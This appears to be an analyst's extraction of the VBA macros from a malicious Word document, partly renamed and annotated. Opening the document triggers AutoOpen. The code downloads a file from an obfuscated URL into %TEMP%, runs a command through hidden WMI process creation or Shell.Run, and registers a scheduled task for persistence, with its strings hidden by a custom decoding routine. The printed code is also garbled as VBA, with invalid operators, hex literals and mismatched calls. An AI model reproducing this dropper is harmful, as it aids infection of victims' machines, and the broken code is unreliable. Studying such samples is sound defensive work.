stream : Macros/VBA/ThisDocument - 1526 bytes
########################################

Sub AutoOpen()
  NewMacros.Workbook_Open
End Sub
stream : Macros/VBA/NewMacros - 24306 bytes
########################################

Function URLDownloadToFile(ByVal pCaller As Long) As Long
  
  Sub Workbook_Open()
    Entrypoint
  End Sub

  Sub setup_file()
    Dim env_var_1 As String
    env_var_1 = Environ("TEMP") & deobf_str("iP") & "7eVuiy8VjwqlwV8OpcVQ==")
    If Not Dir(env_var_1, vbDirectory) = vbNullString Then
      Exit Sub
    End If
    Dim Ced7Pn As String
    #If Win64 Then
      Ced7Pn = deobf_str("oPhSWfo8/Qbyq3BYqC59Urpr+lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho+1GqWpxDsK7wUappuFOi+/dR0qhwVvCqU0U=")
      Ced7Pn = Ced7Pn + "l"
    #End If
    geXy6 = URLDownloadToFile(0, Ced7Pn, env_var_1, 0, 0)
  End Sub

  Public Function Entrypoint() As Variant
    setup_file
    Dim ib1LMED, kedL As String
    ib1LMED = deobf_str("Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d") & Environ("TEMP") & deobf_str("iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy+Ndkq9YVPjYXV0=") & deobf_str("Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f") & deobf_str("ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK+AjSNlJT+HL8XA==")
    q2n4nZ8k5l(ib1LMED)
    KdnbF0
  End Function

  Sub KdnbF0()
    Set FpeceZ5wxyWq = CreateObject(deobf_str("gqV5VqC/WFWi28dQuqfQVg=="))
    Call FpeceZ5wxyWq.Connect()
    Dim td: Set td = FpeceZ5wxyWq.NewTask(0)
    td.RegistrationInfo.Author = deobf_str("mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d")
    td.RegistrationInfo.Description = deobf_str("au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04+lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY+FdSAPzfRsjr51nyJHFZ")
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim SjjH: Set SjjH = td.triggers
    Dim JBnC4fVEA: Set JBnC4fVEA = SjjH.Create(1)
    Dim TEHyxi: ts = DateAdd("d", 1, Now)
    TEHyxi = deobf_str("qlBUCugWcgwi2FUKulBVCupQV04=")
    JBnC4fVEA.StartBoundary = TEHyxi
    JBnC4fVEA.ID = deobf_str("uK/UVug+OVDY+l1d")
    Dim fU0wdOnfj: Set fU0wdOnfj = td.Actions.Create(0)
    fU0wdOnfj.Path = deobf_str("Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f")
    Call FpeceZ5wxyWq.GetFolder("\").RegisterTaskDefinition(deobf_str("mqt4Vqqz8xmAvnBS6OtcXw=="), td, 6, , , 3)
  End Sub

  Sub q2n4nZ8k5l(entry_str As String)
    On Error Resume Next
    Err.Clear
    Mysterious_object = Create_mysterious_object(entry_str)
    If Err.Number != 0 Or Mysterious_object != 0 Then
      Err.Clear
      Run_other_obj entry_str
    End If
    On Error GoTo 0
  End Sub

  Function Create_mysterious_object(entry_str As String) As Integer
    Set Obj = GetObject(deobf_str("+q94VrLvdFlymE4fyL7fVvi2wFPocndd"))
    Set Obj2 = Obj.Get(deobf_str("+q94VrLvdFlymE4fyL7fVvi2wFPocndd"))
    Set q2fpw = Obj2.SpawnInstance_
    q2fpw.ShowWindow = 0
    Set dfHxvyUQe = GetObject(deobf_str("+q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ+vh9Xw=="))
    Create_mysterious_object = dfHxvyUQe.Create(entry_str, Null, q2fpw, intProcessID)
  End Function

  Sub Run_other_obj(entry_str As String)
    CreateObject(deobf_str("ivPlUuC4dhzSqPBW+PpfXQ==")).Run entry_str, 0
  End Sub

  Public Function binary_transform1(ByVal arg1 As Long) As Long
    binary_transform1 = arg1
    If op > 0 Then
      If arg1 > 0 Then
        binary_transform1 = int(binary_transform1 / (2 ^ op))
      Else
        If op > 31 Then
          binary_transform1 = 0
        Else
          binary_transform1 = binary_transform1 And 0x7FFFFFFF
          binary_transform1 = int(binary_transform1 / (2 ^ op))
          binary_transform1 = binary_transform1 Or 2 ^ (31 - op)
        End If
      End If
    End If
  End Function

  Public Function binary_transform2(ByVal arg1 As Long) As Long
    binary_transform2 = arg1
    If op > 0 Then
      Dim i As Byte
      Dim m As Long
      For i = 1 To op
        m = binary_transform2 And 0x40000000
        binary_transform2 = (binary_transform2 And 0x3FFFFFFF) * 2
        If m != 0 Then
          binary_transform2 = binary_transform2 Or 0x80000000
        End If
      Next i
    End If
  End Function

  Public Function binary_transform3(ByVal setup As Long) As Long
    ' Const qQz6 As Long = 5570645
    ' Const GV3upFY4TL As Long = 52428
    Const d1 = 7
    Const d2 = 14
    Dim t As Long, u, out As Long
    t = (setup Xor binary_transform1(setup, d2)) And 52428' GV3upFY4TL
    u = setup Xor t Xor binary_transform2(t, d2)
    t = (u Xor binary_transform1(u, d1)) And 5570645
    out = (u Xor t Xor binary_transform2(t, d1))
    binary_transform3 = out
  End Function

  Public Function do_bitwise_operations(ByRef pre_final_result_array As ) As String
    Dim i, fr, setup, raw As Long
    Dim a As String, B As String, c As String, d As String
    Dim return_value As String
    Dim hF95IT75OEc
    Dim a2, b2 As String
    return_value = ""
    For i = 0 To (UBound(pre_final_result_array) / 4 + 1)
      fr = i * 4
      If fr > UBound(pre_final_result_array) Then
        Exit For
      End If
      setup = 0
      setup = setup Or binary_transform2(pre_final_result_array(fr + 3), 24)
      setup = setup Or binary_transform2(pre_final_result_array(fr + 2), 16)
      setup = setup Or binary_transform2(pre_final_result_array(fr + 1), 8)
      setup = setup Or pre_final_result_array(fr + 0)
      raw = binary_transform3(setup)
      a = Chr(binary_transform1((raw And 0xFF000000), 24))
      B = Chr(binary_transform1((raw And 16711680), 16))
      c = Chr(binary_transform1((raw And 65280), 8))
      d = Chr(binary_transform1((raw And 255), 0))
      return_value = return_value + d + c + B + a
    Next i
    do_bitwise_operations = return_value
  End Function

  Public Function deobf_str(arg_str As String) As String
    Dim pre_final_result, arg_str_array, matrix(255)
    Dim arr1(63), arr2(63)
    Dim arr3(63), mega_byte As Long
    Dim eq_in_str As Integer, iter As Long, index_pre_final_result As Long, i As Long
    Dim kJ6YU As String
    arg_str = Replace(arg_str, vbCr, vbNullString)
    arg_str = Replace(arg_str, vbLf, vbNullString) ' Remove newlines
    i = Len(arg_str) Mod 4 ' Useless ?
    If InStrRev(arg_str, "==") Then
      eq_in_str = 2
    ElseIf InStrRev(arg_str, "" + "=") Then
      eq_in_str = 1
    End If
    For i = 0 To 255 ' Setup matrix for crypto ?
      Select Case i
        Case "A" To "Z"
        matrix(i) = i - "A"
        Case "a" To "z"
        matrix(i) = i - "G"
        Case "0" To "9"
        matrix(i) = i + 4
        Case "+"
        matrix(i) = ">"
        Case "/"
        matrix(i) = "?"
      End Select
    Next i
    For i = 0 To 63
      arr1(i) = i * 64 ' 0x40
      arr2(i) = i * 4096 ' 0x1000 == 64 * 64
      arr3(i) = i * 262144 ' 0x40000 == 64 * 64 * 64
    Next i
    arg_str_array = s
    ReDim pre_final_result((((UBound(arg_str_array) + 1) \ 4) * 3) - 1) ' pre_final_result((int(len(arg_str) + 1 / 4) * 3) - 1)
    For iter = 0 To UBound(arg_str_array) Step 4
      mega_byte = arr3(matrix(arg_str_array(iter))) + arr2(matrix(arg_str_array(iter + 1))) + arr1(matrix(arg_str_array(iter + 2))) + matrix(arg_str_array(iter + 3))
      i = mega_byte And 16711680 ' 0xff0000
      pre_final_result(index_pre_final_result) = i \ 65536 ' 0x10000
      i = mega_byte And 65280 ' 0xff00
      pre_final_result(index_pre_final_result + 1) = i \ 256 ' 0x100
      pre_final_result(index_pre_final_result + 2) = mega_byte And 255 ' 0xff
      index_pre_final_result = index_pre_final_result + 3
    Next iter
    kJ6YU = StrConv(pre_final_result, vbUnicode)
    If eq_in_str Then kJ6YU = Left$(kJ6YU, Len(kJ6YU) - eq_in_str) ' remove les =
    deobf_str = do_bitwise_operations(StrConv(kJ6YU, vbFromUnicode))
    deobf_str = remove_trailing_tilde(deobf_str, "~")
  End Function

  Function remove_trailing_tilde(deobf_str_ret As String) As String
    Dim nb_groups As Long
    Dim splitted_ret
    splitted_ret = Split(deobf_str_ret, "~")
    nb_groups = UBound(splitted_ret, 1)
    If nb_groups != 0 Then
      deobf_str_ret = Left$(deobf_str_ret, Len(deobf_str_ret) - nb_groups)
    End If
    remove_trailing_tilde = deobf_str_ret
  End Function
  

